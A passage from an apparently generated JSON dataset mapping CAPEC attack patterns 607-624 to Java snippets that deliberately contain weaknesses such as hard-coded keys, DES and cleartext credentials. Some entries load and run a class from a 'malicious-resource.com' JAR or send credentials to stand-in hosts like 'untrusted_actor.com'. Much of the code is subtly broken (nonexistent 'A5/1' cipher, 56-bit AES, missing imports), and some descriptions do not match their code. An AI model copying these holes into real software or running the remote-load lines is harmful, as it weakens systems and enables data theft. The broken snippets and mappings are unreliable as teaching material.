        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class InsecureEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-321: Hard-coded cryptographic key\n        byte[] hardCodedKey = \"my_secret_key\".getBytes();\n        SecretKey key = new SecretKeySpec(hardCodedKey, \"AES\");\n\n        // CWE-327: Use of a broken or risky cryptographic algorithm\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\", \"SunJCE\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // CWE-326: Inadequate encryption strength\n        String plaintext = \"confidential_data\";\n        byte[] encryptedData = cipher.doFinal(plaintext.getBytes());\n\n        // CWE-924: Improper enforcement of message integrity during transmission\n        // No integrity check or digital signature is used to ensure the data is not modified during transmission\n\n        // CWE-757: Selection of less-secure algorithm during negotiation\n        // The algorithm is not negotiated with the other party, and a weak algorithm is used by default\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing a mobile device to use no encryption or weak encryption. It includes CWE-321 by using a hard-coded cryptographic key, CWE-327 by using a broken or risky cryptographic algorithm, CWE-326 by using inadequate encryption strength, CWE-924 by not ensuring message integrity during transmission, and CWE-757 by not negotiating the algorithm with the other party and using a weak algorithm by default."
    },
    {
        "capec_id": "607",
        "code_snippet": "public class VulnerableSystem {\n    private boolean isRedundant = true;\n    private boolean isCompartmentalized = true;\n    private boolean isFaultHandled = true;\n    private boolean isHardwareLogicCorrect = true;\n\n    public void interactWithComponent() {\n        if (!isRedundant) {\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            throw new RuntimeException(\"Error injected into redundant block\");\n        }\n        if (!isCompartmentalized) {\n            // CWE-653: Improper Isolation or Compartmentalization\n            accessSensitiveData();\n        }\n        if (!isFaultHandled) {\n            // CWE-1332: Improper Handling of Faults that Lead to Instruction Skips\n            skipSecurityCriticalInstructions();\n        }\n        if (!isHardwareLogicCorrect) {\n            // CWE-1298: Hardware Logic Contains Race Conditions\n            executeRacyInstructions();\n        }\n    }\n\n    private void accessSensitiveData() {\n        // Sensitive data access\n    }\n\n    private void skipSecurityCriticalInstructions() {\n        // Skipping security-critical CPU instructions\n    }\n\n    private void executeRacyInstructions() {\n        // Executing racy instructions\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable system that can be obstructed by an attacker, leading to a degraded state or system failure. The system components are not properly isolated, and faults are not handled correctly, allowing an attacker to inject errors, skip security-critical instructions, and execute racy instructions, ultimately causing the system to malfunction."
    },
    {
        "capec_id": "608",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class VulnerableCellularEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"A5/1\");\n        SecureRandom random = SecureRandom.getInstance(\"SHA1PRNG\");\n        keyGen.init(64, random);\n        SecretKey key = keyGen.generateKey();\n\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        byte[] hardcodedKey = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};\n        Cipher cipher = Cipher.getInstance(\"A5/1\");\n        cipher.init(Cipher.ENCRYPT_MODE, new javax.crypto.spec.SecretKeySpec(hardcodedKey, \"A5/1\"));\n\n        // CWE-326: Inadequate Encryption Strength\n        String plaintext = \"Mobile phone conversation\";\n        byte[] encryptedData = cipher.doFinal(plaintext.getBytes());\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        String[] availableAlgorithms = {\"A5/1\", \"A5/2\"};\n        String selectedAlgorithm = availableAlgorithms[0];\n        System.out.println(\"Selected algorithm: \" + selectedAlgorithm);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the use of a broken or risky cryptographic algorithm (A5/1), a hard-coded cryptographic key, inadequate encryption strength, and the selection of a less-secure algorithm during negotiation. These vulnerabilities can be exploited to reveal traffic content in cellular encryption."
    },
    {
        "capec_id": "609",
        "code_snippet": "import java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\n\npublic class CellularTrafficInterceptor {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"malicious_cellular_tower\", 8080);\n        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \"user_credentials\";\n        dataOutputStream.writeUTF(sensitiveData);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String incomingRequest = \"malicious_actor_request\";\n        processRequest(incomingRequest);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String receivedMessage = \"unverified_message\";\n        processMessage(receivedMessage);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String cleartextData = \"credit_card_number\";\n        dataOutputStream.writeUTF(cleartextData);\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication (Android-specific, not applicable in this Java example)\n    }\n\n    private static void processRequest(String request) {\n        // No verification of request origin\n    }\n\n    private static void processMessage(String message) {\n        // No message integrity verification\n    }\n}",
        "description": "This Java code snippet demonstrates a cellular traffic interceptor that embodies the main idea of the CAPEC. It includes vulnerabilities related to missing encryption of sensitive data, improper verification of the source of a communication channel, improper enforcement of message integrity during transmission, cleartext transmission of sensitive information, and use of implicit intent for sensitive communication (although the latter is Android-specific and not applicable in this Java example)."
    },
    {
        "capec_id": "610",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"password=123456\";\n        out.writeUTF(sensitiveData);\n\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String message = \"Hello, my username is admin\";\n        out.writeUTF(message);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        byte[] receivedData = new byte[1024];\n        in.read(receivedData);\n        String receivedMessage = new String(receivedData);\n        System.out.println(\"Received message: \" + receivedMessage);\n\n        // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        for (int i = 0; i < 100; i++) {\n            out.writeUTF(\"Amplified message\" + i);\n        }\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // Assume a debug mode is enabled, allowing an adversary to alter the state of the hardware\n        boolean debugMode = true;\n        if (debugMode) {\n            System.out.println(\"Debug mode enabled. Altering hardware state...\");\n            // Adversary can alter the state of the hardware here\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of injecting data into mobile technology traffic to disrupt communications or conduct additional surveillance operations. It includes vulnerabilities related to CWE-319 (cleartext transmission of sensitive information), CWE-201 (insertion of sensitive information into sent data), CWE-924 (improper enforcement of message integrity during transmission), CWE-406 (insufficient control of network message volume), and CWE-1313 (hardware allows activation of test or debug logic at runtime)."
    },
    {
        "capec_id": "611",
        "code_snippet": "import java.io.IOException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class BitSquattingExample {\n    public static void redirectUser(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"url\");\n        try {\n            URI userURI = new URI(userInput);\n            URL redirectURL = userURI.toURL();\n            response.sendRedirect(redirectURL.toString());\n        } catch (URISyntaxException e) {\n            // Handle invalid URI\n        }\n    }\n\n    public static void downloadCodeWithoutIntegrityCheck(String url) throws IOException {\n        URL downloadURL = new URL(url);\n        // Download and execute code without verifying origin and integrity\n        // This is a bad practice and should not be done in production code\n    }\n\n    public static void authenticateUser(HttpServletRequest request) {\n        String userInput = request.getParameter(\"username\");\n        String userPassword = request.getParameter(\"password\");\n        // Authenticate user without proper validation and verification\n        // This is a bad practice and should not be done in production code\n    }\n\n    public static void processGETRequestWithSensitiveQuery(HttpServletRequest request) {\n        String queryString = request.getQueryString();\n        // Process GET request with sensitive information in query string\n        // This is a bad practice and should not be done in production code\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of BitSquatting, which involves registering a domain name one bit different than a trusted domain to redirect Internet traffic to an adversary-controlled destination. The code includes vulnerabilities related to CWE-601 (URL Redirection to Untrusted Site), CWE-494 (Download of Code Without Integrity Check), CWE-294 (Authentication Bypass by Capture-replay), and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "612",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.NetworkInterface;\nimport java.net.SocketException;\nimport java.util.Enumeration;\n\npublic class MACAddressTracker {\n    public static void main(String[] args) throws SocketException {\n        DatagramSocket socket = new DatagramSocket();\n        socket.setBroadcast(true);\n\n        Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();\n        while (interfaces.hasMoreElements()) {\n            NetworkInterface networkInterface = interfaces.nextElement();\n            byte[] macBytes = networkInterface.getHardwareAddress();\n            if (macBytes != null) {\n                StringBuilder macAddress = new StringBuilder();\n                for (byte b : macBytes) {\n                    macAddress.append(String.format(\"%02X\", b));\n                }\n                System.out.println(\"MAC Address: \" + macAddress.toString());\n\n                // Send MAC address over the network without proper access control\n                DatagramPacket packet = new DatagramPacket(macAddress.toString().getBytes(), macAddress.toString().getBytes().length, InetAddress.getByName(\"255.255.255.255\"), 12345);\n                socket.send(packet);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that transmits sensitive information (MAC address) over a network without proper access control, allowing an attacker to track users. The code uses DatagramSocket to send the MAC address as a broadcast packet, making it accessible to anyone on the network. This code embodies the CAPEC of tracking users based on their MAC addresses and relates to CWEs 201, 300, 421, and 529."
    },
    {
        "capec_id": "613",
        "code_snippet": "public class WiFiTracker {\n    public static void main(String[] args) {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String ssid = \"MyPublicWiFi\";\n        sendWiFiManagementFrame(ssid);\n    }\n\n    public static void sendWiFiManagementFrame(String ssid) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the identity of the actor at the other end of the communication channel\n        WiFiAccessPoint ap = new WiFiAccessPoint();\n        ap.sendManagementFrame(ssid);\n    }\n}\n\nclass WiFiAccessPoint {\n    public void sendManagementFrame(String ssid) {\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // Incorrect decoding of the SSID, allowing untrusted agents to gain unauthorized access\n        byte[] ssidBytes = ssid.getBytes();\n        // CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n        // No unique, immutable identifier for the WiFi access point\n        int apId = 0;\n        // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n        // No security identifier in the transaction\n        sendBytesOverWiFi(ssidBytes, apId);\n    }\n\n    public void sendBytesOverWiFi(byte[] bytes, int apId) {\n        // Simulate sending bytes over WiFi\n        System.out.println(\"Sending bytes: \" + new String(bytes) + \" from AP: \" + apId);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack scenario where an attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. The code transmits the SSID without proper verification of the identity of the actor at the other end of the communication channel, and without a unique, immutable identifier for the WiFi access point. Additionally, the code does not include a security identifier in the transaction, allowing untrusted agents to gain unauthorized access."
    },
    {
        "capec_id": "614",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.Key;\n\npublic class SIMCardExploit {\n    public static void main(String[] args) throws Exception {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\");\n        keyGen.init(56); // Inadequate encryption strength (CWE-326)\n        SecretKey desKey = keyGen.generateKey();\n\n        // CWE-1277: Firmware Not Updateable\n        // Assume the firmware is not updateable, and the DES key is hardcoded\n        byte[] desKeyBytes = desKey.getEncoded();\n\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        // Assume the confidential information is stored in plaintext on the device\n        String confidentialInfo = \"payment_credentials\";\n\n        // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n        // Assume the debug interface is accessible without proper authorization\n        boolean debugMode = true;\n\n        // Send OTA update with malicious Java applet\n        sendOTAUpdate(desKeyBytes, confidentialInfo, debugMode);\n    }\n\n    public static void sendOTAUpdate(byte[] desKeyBytes, String confidentialInfo, boolean debugMode) throws Exception {\n        // Create a malicious Java applet that can access sensitive information\n        String appletCode = \"...\";\n\n        // Sign the applet with the cracked DES key\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(desKeyBytes, \"DES\"));\n        byte[] signedApplet = cipher.doFinal(appletCode.getBytes());\n\n        // Send the OTA update with the signed applet\n        sendSMS(signedApplet);\n    }\n\n    public static void sendSMS(byte[] data) throws Exception {\n        // Send the SMS message with the malicious applet\n        // This will be executed on the SIM card, allowing the attacker to access sensitive information\n        // ... implementation of SMS sending logic ...\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack on SIM cards, leveraging OTA updates to deliver executable code to the SIM. The code uses a broken cryptographic algorithm (DES), inadequate encryption strength, and unprotected confidential information on the device. It also assumes the firmware is not updateable and the debug interface has improper access control. The malicious Java applet is sent as an OTA update, which can access sensitive information on the SIM card."
    },
    {
        "capec_id": "615",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\n\npublic class RogueWiFiAccessPoint {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the client's identity\n        String clientData = in.readUTF();\n        System.out.println(\"Received from client: \" + clientData);\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // No restriction on the communication channel\n        out.writeUTF(\"Hello from rogue access point!\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the communication channel\n        String response = in.readUTF();\n        System.out.println(\"Response from client: \" + response);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // Sensitive data transmitted in cleartext\n        out.writeUTF(\"Your password is: password123\");\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No enforcement of message integrity during transmission\n        String message = in.readUTF();\n        System.out.println(\"Message from client: \" + message);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a rogue Wi-Fi access point that intercepts and analyzes Wi-Fi data traffic. It establishes a communication channel with a client without verifying the client's identity, allowing an adversary to access the channel. The code transmits sensitive data in cleartext and does not ensure the integrity of the communication channel, making it vulnerable to tampering and eavesdropping."
    },
    {
        "capec_id": "616",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousResource {\n    public static void main(String[] args) throws IOException {\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String sensitiveInfo = \"topSecret\";\n        System.out.println(sensitiveInfo);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        URL[] urls = new URL[] {new URL(\"http://malicious-resource.com/malicious.jar\")};\n        URLClassLoader loader = new URLClassLoader(urls);\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousClass\");\n        Object maliciousObject = maliciousClass.newInstance();\n\n        // CWE-1229: Creation of Emergent Resource\n        File maliciousFile = new File(\"malicious-resource.txt\");\n        maliciousFile.createNewFile();\n\n        // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n        String privateResource = \"private-resource\";\n        System.out.println(privateResource);\n\n        // CWE-426: Untrusted Search Path\n        System.setProperty(\"java.library.path\", \"./malicious-library\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of providing a malicious version of a resource at a similar location to the expected legitimate resource. It includes CWE-200 by exposing sensitive information, CWE-940 by improperly verifying the source of a communication channel, CWE-1229 by creating an emergent resource, CWE-402 by transmitting private resources into a new sphere, and CWE-426 by using an untrusted search path."
    },
    {
        "capec_id": "617",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class RogueBaseStation {\n    public static void main(String[] args) throws IOException {\n        ServerSocket rogueBaseStation = new ServerSocket(8080);\n        System.out.println(\"Rogue base station started...\");\n\n        Socket retransmissionDevice = rogueBaseStation.accept();\n        System.out.println(\"Retransmission device connected...\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // CWE-421: Race Condition During Access to Alternate Channel\n        String message = \"Hello, I'm the rogue base station!\";\n        retransmissionDevice.getOutputStream().write(message.getBytes());\n    }\n}",
        "description": "This Java code snippet demonstrates a rogue base station that can imitate a cellular base station, allowing it to communicate with a retransmission device without proper verification of the communication channel. The rogue base station establishes a connection with the retransmission device and sends a message without ensuring the integrity of the channel or verifying the identity of the endpoint."
    },
    {
        "capec_id": "618",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class LocationVerifier {\n    public static void main(String[] args) throws Exception {\n        String targetPhoneNumber = \"1234567890\";\n        String lac = getLACFromPhoneNumber(targetPhoneNumber);\n        String broadcastMessage = \"Hello, world!\";\n        Socket socket = new Socket(\"cell-tower.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(broadcastMessage.getBytes());\n        outputStream.flush();\n        socket.close();\n        \n        // Receive response from cellular network\n        ServerSocket serverSocket = new ServerSocket(8081);\n        Socket incomingSocket = serverSocket.accept();\n        InputStream inputStream = incomingSocket.getInputStream();\n        byte[] responseBytes = new byte[1024];\n        int bytesRead = inputStream.read(responseBytes);\n        String response = new String(responseBytes, 0, bytesRead);\n        \n        if (response.contains(broadcastMessage)) {\n            System.out.println(\"Target is in location: \" + lac);\n        } else {\n            System.out.println(\"Target is not in location: \" + lac);\n        }\n    }\n\n    private static String getLACFromPhoneNumber(String phoneNumber) {\n        // TO DO: implement logic to retrieve LAC from phone number\n        return \"LAC123\";\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of the CAPEC attack, where an attacker uses knowledge of the target's mobile phone number to cause the cellular network to send a broadcast message to the target's location. The code transmits the broadcast message to the cellular network without verifying the integrity of the message or the source of the communication channel, and then listens for the response to determine the target's location. The code is vulnerable to CWE-201, CWE-924, CWE-940, CWE-927, and CWE-300."
    },
    {
        "capec_id": "619",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class SignalTracker {\n    public static void main(String[] args) throws SocketException, UnknownHostException {\n        DatagramSocket socket = new DatagramSocket(12345);\n        InetAddress address = InetAddress.getByName(\"target_ip\");\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveInfo = \"IMSI: 1234567890\";\n        byte[] sensitiveBytes = sensitiveInfo.getBytes();\n        packet.setData(sensitiveBytes);\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // No protection mechanism to prevent physical side channels\n        // from exposing sensitive information\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the incoming request\n        socket.receive(packet);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No check for message integrity during transmission\n        String receivedData = new String(packet.getData());\n        System.out.println(\"Received data: \" + receivedData);\n\n        // CWE-432: Dangerous Signal Handler not Disabled During Sensitive Operations\n        // No proper masking or prevention of signal handlers\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            public void run() {\n                System.out.println(\"Shutdown hook executed\");\n            }\n        });\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a signal tracker that can be exploited using the described CAPEC. It includes CWEs 201, 1300, 940, 924, and 432, making it susceptible to various attacks."
    },
    {
        "capec_id": "620",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class InsecureEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \"confidential\";\n\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        String hardCodedKey = \"my_secret_key\";\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(56); // CWE-326: Inadequate Encryption Strength\n        SecretKey key = keyGen.generateKey();\n\n        // CWE-312: Cleartext Storage of Sensitive Information\n        System.out.println(\"Sensitive data: \" + sensitiveData);\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        String[] availableAlgorithms = {\"AES\", \"DES\"};\n        String selectedAlgorithm = availableAlgorithms[1]; // Selecting a weaker algorithm\n\n        Cipher cipher = Cipher.getInstance(selectedAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedData = cipher.doFinal(sensitiveData.getBytes());\n\n        System.out.println(\"Encrypted data: \" + new String(encryptedData));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing the encryption level to be lowered, making it vulnerable to attacks. It includes CWE-311 (missing encryption), CWE-321 (hard-coded cryptographic key), CWE-326 (inadequate encryption strength), CWE-312 (cleartext storage of sensitive information), and CWE-757 (selection of less-secure algorithm during negotiation)."
    },
    {
        "capec_id": "621",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\n\npublic class TimingAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        String sensitiveData = \"secretKey\";\n        String nonSensitiveData = \"publicData\";\n\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        out.writeUTF(sensitiveData);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        out.writeUTF(nonSensitiveData);\n\n        // CWE-385: Covert Timing Channel\n        if (authenticateUser(sensitiveData)) {\n            Thread.sleep(500); // delay for authenticated users\n        }\n\n        // CWE-208: Observable Timing Discrepancy\n        if (isAuthorized(sensitiveData)) {\n            out.writeInt(1); // send response immediately for authorized users\n        } else {\n            Thread.sleep(1000); // delay for unauthorized users\n            out.writeInt(0);\n        }\n    }\n\n    private static boolean authenticateUser(String data) {\n        // simulate authentication process\n        return data.equals(\"secretKey\");\n    }\n\n    private static boolean isAuthorized(String data) {\n        // simulate authorization process\n        return data.equals(\"authorizedKey\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of intercepting and logging encrypted transmissions to analyze metadata. It includes CWE-201 by sending sensitive data, CWE-319 by transmitting sensitive data in cleartext, CWE-385 by introducing a covert timing channel through delayed responses, and CWE-208 by creating an observable timing discrepancy based on user authorization."
    },
    {
        "capec_id": "622",
        "code_snippet": "public class VulnerableCryptoProcessor {\n    private static final String SECRET_KEY = \"my_secret_key\";\n    \n    public static void processSensitiveData(String data) {\n        try {\n            // CWE-327: Using a broken or risky cryptographic algorithm\n            Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n            cipher.init(Cipher.ENCRYPT_MODE, new RSAKey(SECRET_KEY));\n            byte[] encryptedData = cipher.doFinal(data.getBytes());\n            \n            // CWE-201: Insertion of Sensitive Information Into Sent Data\n            sendToUntrustedActor(encryptedData);\n        } catch (Exception e) {\n            // CWE-300: Channel Accessible by Non-Endpoint\n            // No proper verification of the actor at the other end of the channel\n            sendErrorToUntrustedActor(e.getMessage());\n        }\n    }\n    \n    private static void sendToUntrustedActor(byte[] data) {\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // No protection against electromagnetic emanations\n        Socket socket = new Socket(\"untrusted_actor.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(data);\n        outputStream.close();\n    }\n    \n    private static void sendErrorToUntrustedActor(String error) {\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // No protection against electromagnetic fault injection attacks\n        Socket socket = new Socket(\"untrusted_actor.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(error.getBytes());\n        outputStream.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable cryptographic processor that embodies the main idea of the CAPEC. It uses a broken or risky cryptographic algorithm, inserts sensitive information into sent data, and lacks protection against physical side channels and electromagnetic fault injection attacks. The code is susceptible to electromagnetic emanations and fault injection attacks, allowing an attacker to recover cryptographic keys or compromise device internal information."
    },
    {
        "capec_id": "623",
        "code_snippet": "public class EmanationVulnerability {\n    public static void processSensitiveData(String sensitiveInfo) {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String dataToTransmit = \"Processing: \" + sensitiveInfo;\n        transmitData(dataToTransmit);\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // No protection against acoustic emissions\n        System.out.println(\"Processing data...\");\n\n        // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        // Untrusted agents can disable alerts about signal conditions exceeding limits\n        if (dataToTransmit.length() > 1024) {\n            System.out.println(\"Data too large, truncating...\");\n            dataToTransmit = dataToTransmit.substring(0, 1024);\n        }\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // No protection against electromagnetic fault injection attacks\n        int result = performOperation(dataToTransmit);\n        if (result == 0) {\n            System.out.println(\"Operation failed, retrying...\");\n        }\n\n        // CWE-1420: Exposure of Sensitive Information during Transient Execution\n        // No protection against transient execution attacks\n        int transientResult = performTransientOperation(dataToTransmit);\n        if (transientResult != 0) {\n            System.out.println(\"Transient operation succeeded, but may have exposed sensitive data...\");\n        }\n    }\n\n    private static int performOperation(String data) {\n        // Simulate an operation that may emit acoustic emissions\n        System.out.println(\"Performing operation...\");\n        return 1;\n    }\n\n    private static int performTransientOperation(String data) {\n        // Simulate a transient operation that may expose sensitive data\n        System.out.println(\"Performing transient operation...\");\n        return 1;\n    }\n\n    private static void transmitData(String data) {\n        // Simulate data transmission, potentially emitting electromagnetic emissions\n        System.out.println(\"Transmitting data...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable system that processes sensitive information and transmits it over a network, emitting acoustic and electromagnetic signals that can be intercepted by an attacker. The code lacks protection against physical side channels, electromagnetic fault injection, and transient execution attacks, making it susceptible to compromising emanations."
    },
    {
        "capec_id": "624",
        "code_snippet": "public class VulnerableCryptoDevice {\n    private static final int CLOCK_SPEED = 1000000; // 1 MHz\n    private static final int VOLTAGE_THRESHOLD = 500; // 5V\n    private static final int TEMPERATURE_THRESHOLD = 80; // 80\u00b0C\n    private static final int COLD_TEMPERATURE_THRESHOLD = -20; // -20\u00b0C\n\n    public static void performCryptographicOperation(byte[] data) {\n        // No protection against voltage and clock glitches\n        int voltage = readVoltage();\n        if (voltage < VOLTAGE_THRESHOLD) {\n            // No mitigation or detection of voltage glitches\n            System.out.println(\"Voltage glitch detected!\");\n        }\n\n        int clockSpeed = readClockSpeed();\n        if (clockSpeed != CLOCK_SPEED) {\n            // No mitigation or detection of clock glitches\n            System.out.println(\"Clock glitch detected!\");\n        }\n\n        // No protection against electromagnetic fault injection\n        try {\n            performCryptoOperation(data);\n        } catch (Exception e) {\n            // No proper handling of faults that lead to instruction skips\n            System.out.println(\"Error during crypto operation: \" + e.getMessage());\n        }\n\n        // No protection against hardware overheating\n        int temperature = readTemperature();\n        if (temperature > TEMPERATURE_THRESHOLD) {\n            // No mitigation or detection of overheating\n            System.out.println(\"Device overheating!\");\n        }\n\n        // No protection against exceptionally cold environments\n        if (temperature < COLD_TEMPERATURE_THRESHOLD) {\n            // No mitigation or detection of cold temperatures\n            System.out.println(\"Device too cold!\");\n        }\n    }\n\n    private static int readVoltage() {\n        // Simulate reading voltage from hardware\n        return (int) (Math.random() * 1000);\n    }\n\n    private static int readClockSpeed() {\n        // Simulate reading clock speed from hardware\n        return (int) (Math.random() * 2000000);\n    }\n\n    private static int readTemperature() {\n        // Simulate reading temperature from hardware\n        return (int) (Math.random() * 150);\n    }\n\n    private static void performCryptoOperation(byte[] data) {\n        // Simulate cryptographic operation\n        System.out.println(\"Performing crypto operation...\");\n        // No protection against semiconductor defects or improper restriction of software interfaces to hardware features\n        // No protection against unauthorized error injection that can degrade hardware redundancy\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable cryptographic device that is susceptible to various types of attacks, including voltage and clock glitches, electromagnetic fault injection, hardware overheating, and exceptionally cold environments. The device lacks proper protection mechanisms, such as detection and mitigation of glitches, and does not handle faults that lead to instruction skips. Additionally, the device does not restrict software interfaces to hardware features, making it vulnerable to unauthorized error injection and semiconductor defects."
    },
    {
        "capec_id": "625",
